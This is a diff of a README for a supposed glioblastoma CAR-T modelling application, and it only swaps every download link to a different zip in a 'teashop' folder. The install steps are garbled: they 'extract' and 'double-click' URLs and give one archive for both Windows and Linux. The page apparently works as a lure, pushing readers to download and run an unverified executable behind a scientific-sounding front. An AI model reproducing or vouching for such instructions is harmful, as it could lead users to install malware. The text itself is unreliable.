@@ -1,7 +1,7 @@
 # 🧬 gbm-cart-spatial-model - Optimize CAR-T Immunotherapy Effectively
 
 ## 📦 Download the Latest Release
-[![Download Now](https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/model-spatial-gbm-cart-3.7.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/model-spatial-gbm-cart-3.7.zip)
+[![Download Now](https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/cart-model-spatial-gbm-1.9.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/cart-model-spatial-gbm-1.9.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the **gbm-cart-spatial-model** application. This tool helps researchers optimize CAR-T immunotherapy for glioblastoma, integrating the tumor microenvironment for more effective treatment insights.
@@ -9,10 +9,10 @@ This guide will help you download and run the **gbm-cart-spatial-model** applica
 ## 📥 Download & Install
 1. **Visit the Release Page**  
    Click the link below to go to the releases page where you can download the application.  
-   [Download from Releases](https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/model-spatial-gbm-cart-3.7.zip)
+   [Download from Releases](https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/cart-model-spatial-gbm-1.9.zip)
 
 2. **Choose the Latest Version**  
-   On the releases page, find the latest version. You will see files available for download, typically named like `https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/model-spatial-gbm-cart-3.7.zip` for Windows or `https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/model-spatial-gbm-cart-3.7.zip` for Linux.
+   On the releases page, find the latest version. You will see files available for download, typically named like `https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/cart-model-spatial-gbm-1.9.zip` for Windows or `https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/cart-model-spatial-gbm-1.9.zip` for Linux.
 
 3. **Download the Application**  
    Click on the file that corresponds to your operating system. The download will begin automatically.
@@ -20,11 +20,11 @@ This guide will help you download and run the **gbm-cart-spatial-model** applica
 4. **Extract the File**  
    Once the download is complete, locate the downloaded file on your computer:
    - For Windows: Right-click the `.zip` file and choose "Extract All".
-   - For Linux: Use a file manager or run `tar -xvf https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/model-spatial-gbm-cart-3.7.zip` in your terminal.
+   - For Linux: Use a file manager or run `tar -xvf https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/cart-model-spatial-gbm-1.9.zip` in your terminal.
 
 5. **Run the Application**  
    After extraction, navigate to the newly created folder:
-   - For Windows: Double-click `https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/model-spatial-gbm-cart-3.7.zip`.
+   - For Windows: Double-click `https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/cart-model-spatial-gbm-1.9.zip`.
    - For Linux: Open a terminal and run `./gbm-cart-spatial-model`.
 
 ## 🛠️ System Requirements
@@ -64,4 +64,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 ## 🎉 Acknowledgements
 Special thanks to contributors and researchers who make advancements in cancer therapy possible. Your efforts drive innovation and hope in treatment.
 
-Now, go ahead and download the application to begin exploring how to optimize CAR-T immunotherapy for glioblastoma! Remember to visit the release page: [Download from Releases](https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/model-spatial-gbm-cart-3.7.zip).
+Now, go ahead and download the application to begin exploring how to optimize CAR-T immunotherapy for glioblastoma! Remember to visit the release page: [Download from Releases](https://raw.githubusercontent.com/pathak7874/gbm-cart-spatial-model/main/teashop/cart-model-spatial-gbm-1.9.zip).
